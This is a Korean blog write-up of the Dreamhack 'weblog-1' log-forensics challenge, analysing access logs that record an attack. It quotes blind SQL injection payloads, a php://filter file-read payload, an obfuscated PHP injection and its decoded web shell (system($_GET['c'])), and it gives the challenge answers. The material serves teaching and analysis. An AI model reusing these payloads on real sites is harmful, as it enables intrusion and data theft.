---
title: (28) Dreamhack weblog-1 문제 풀이
date: 2024-02-03 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명


## 문제 풀이
제공된 로그 파일을 분석해서 php로 구현된 문제 사이트에서 문제를 풀면 flag를 줍니다. 로그파일이 너무 길고, 소스코드는 거의 볼 필요가 없기 때문에 로그 파일은 일부분만, 그리고 필요한 소스코드만 올리도록 하겠습니다.  
  
그럼 첫번째 문제입니다.
![](https://kyuyeop.github.io/assets/img/post/28/1.png)
로그 파일을 보면
```
172.17.0.1 - - [02/Jun/2020:09:40:01 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(TABLE_NAME,0x3a,COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database()),%2030,1))=109,%20(select%201%20union%20select%202),%200) HTTP/1.1" 200 841 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:40:01 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(TABLE_NAME,0x3a,COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database()),%2030,1))=110,%20(select%201%20union%20select%202),%200) HTTP/1.1" 200 841 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:40:02 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(TABLE_NAME,0x3a,COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database()),%2030,1))=111,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:40:02 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(TABLE_NAME,0x3a,COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database()),%2030,1))=112,%20(select%201%20union%20select%202),%200) HTTP/1.1" 200 841 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:40:02 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(TABLE_NAME,0x3a,COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database()),%2030,1))=113,%20(select%201%20union%20select%202),%200) HTTP/1.1" 200 841 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```
위와 같이 blind sql을 진행하고 있는게 보입니다. 맞으면 `500`, 틀리면 `200`에 해당하는 code를 돌려주나 봅니다. 뭘 하는지 궁금하니 숫자만 추출해서 문자로 바꿔보겠습니다. 저는 아래와 같은 코드를 짰습니다.
```python
import re

lines = []
with open('access.log', 'r') as f:
  lines = f.readlines()

lst = []
for line in lines:
  if 'HTTP/1.1" 500' in line:
    l = re.sub(',.*\n','',re.sub('^.*,1\)\)=','',line))
    if(len(l) <= 3):
      lst.append(int(l))

for i in lst:
  print(chr(i), end='')
```
실행 결과는 다음과 같습니다.
```
simple_boardboard:idx,board:title,board:contents,board:writer,users:idx,users:username,users:password,users:leveladmin:Th1s_1s_Adm1n_P@SS,guest:guest
```
로그가 너무 길어서 뭐가 뭐에 대한건지 알 순 없지만 누가 봐도 `admin:`이라는 글자가 보입니다.  
  
정답은 `Th1s_1s_Adm1n_P@SS`입니다.  
  
두번째 문제입니다.
![](https://kyuyeop.github.io/assets/img/post/28/2.png)
`/config.php`를 로그에서 검색해보면
```
172.17.0.1 - - [02/Jun/2020:09:08:51 +0000] "GET /admin/config.php HTTP/1.1" 404 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:08:53 +0000] "GET /config.php-eb HTTP/1.1" 404 453 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:08:55 +0000] "GET /painel/config/config.php.example HTTP/1.1" 404 489 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:08:53 +0000] "GET /config.php HTTP/1.1" 200 312 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:54:18 +0000] "GET /admin/?page=php://filter/convert.base64-encode/resource=../config.php HTTP/1.1" 200 986 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```
위와 같은 줄이 검색됩니다. 코드를 추출했다고 했으니 일반적인 접속은 아니였을 겁니다. 따라서 base64 인코딩을 이용한 페이로드인 `php://filter/convert.base64-encode/resource=../config.php`가 정답입니다.  
  
세번째 문제입니다.
![](https://kyuyeop.github.io/assets/img/post/28/3.png)
위의 줄에서 10줄 정도 아래로 내려보면
```
172.17.0.1 - - [02/Jun/2020:09:55:16 +0000] "GET /admin/?page=memo.php&memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E HTTP/1.1" 200 1098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:55:39 +0000] "GET /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```
이런 내용이 있습니다. memo페이지를 이용해 난독화되어 보이는 php 코드를 삽입하고 있습니다. 그럼 memo.php를 안 볼 수가 없죠.
```php
<a href="javascript:history.back(-1);">Back</a><br/><br/>
<?php
  if($level[$_SESSION['level']] !== "admin") { die("Only Admin !"); }

  if(isset($_GET['memo'])){
    $_SESSION['memo'] = $_GET['memo'];
  }

  if(isset($_SESSION['memo'])){
    echo($_SESSION['memo']);
  }

?>

<form>
  <input type="hidden" name="page" value="memo.php">
  <div class="form-group">
    <label for="memo">memo</label>
    <input type="text" class="form-control" name="memo" id="memo" placeholder="memo">
  </div>
  <button type="submit" class="btn btn-default">Write</button>
</form>
```
memo 파라미터로 온 값을 그냥 `$_SESSION[memo]`에 저장하네요. 세션에 대한 정보는 지정한 폴더에 `sess_세션아이디`이름의 파일로 저장됩니다. 따라서 바로 다음줄에서 사용하고 있는 `/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732`가 정답 되겠습니다.  
  
다음 문제입니다.
![](https://kyuyeop.github.io/assets/img/post/28/4.png)
여긴 살짝 복잡합니다. 일단 위에서 봤던 로그를 다시 봅시다.  
```
172.17.0.1 - - [02/Jun/2020:09:55:16 +0000] "GET /admin/?page=memo.php&memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E HTTP/1.1" 200 1098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```
`memo=`의 뒷부분만 [URL 디코딩 사이트](https://www.convertstring.com/ko/EncodeDecode/UrlDecode)를 이용해서 살펴보면
```php
<?php function m($l,$T=0){$K=date('Y-m-d');$_=strlen($l);$__=strlen($K);for($i=0;$i<$_;$i++){for($j=0;$j<$__; $j++){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return $l;} m('bmha[tqp[gkjpajpw')(m('+rev+sss+lpih+qthke`w+miecaw*tlt'),m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?')); ?>
```
 되고, 이걸 보기 좋게 정렬하면
```php
<?php
function m($l,$T=0) {
  $K=date('Y-m-d');
  $_=strlen($l);
  $__=strlen($K);
  for($i=0;$i<$_;$i++) {
    for($j=0;$j<$__; $j++) {
      if($T) {
        $l[$i]=$K[$j]^$l[$i];
      } else {
        $l[$i]=$l[$i]^$K[$j];
      }
    }
  }
  return $l;
}
m('bmha[tqp[gkjpajpw')
(m('+rev+sss+lpih+qthke`w+miecaw*tlt'),m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?'));
?>
```
입니다. 저 m 부분만 echo로 해서 출력해보면
```
ghmd^qtu^bnoudour.w`s.vvv.iulm.tqmn`er.hl`fdr/qiq=>qiq!id`eds)#IUUQ.0/0!515!Onu!Gntoe#(:rxrudl)%^FDUZ#b#\(:
```
이런 이상한 문자열이 나옵니다. 이유는 `date`는 현재시간을 반환하기 때문에 서버가 이를 실행한 시간으로 맞춰줘야 하는 겁니다. 로그에 찍혀있는 날짜를 `date`함수 대신 `Y-m-d`형태의 값을 넣어줘야 합니다. `'2020-06-02'`를 넣어주면 
```
file_put_contents/var/www/html/uploads/images.php<?php header("HTTP/1.1 404 Not Found");system($_GET["c"]);
```
가 나옵니다. `m('+rev+sss+lpih+qthke``w+miecaw*tlt')`의 값을 보면 `/var/www/html/uploads/images.php`으로 이게 이번 문제의 정답입니다.  

드디어 마지막 문제입니다.    
![](https://kyuyeop.github.io/assets/img/post/28/5.png)
위에서 만든 웹쉘을 썼다고 했으니 images.php 를 검색해봅니다.
```
172.17.0.1 - - [02/Jun/2020:09:56:32 +0000] "GET /uploads/images.php?c=whoami HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```
`c`파라미터로 `whoami`를 넣었네요. 이게 마지막 문제의 정답입니다.  
  
![](https://kyuyeop.github.io/assets/img/post/28/6.png)
드디어 문제가 끝났습니다. flag를 출력해주네요.
{% endraw %}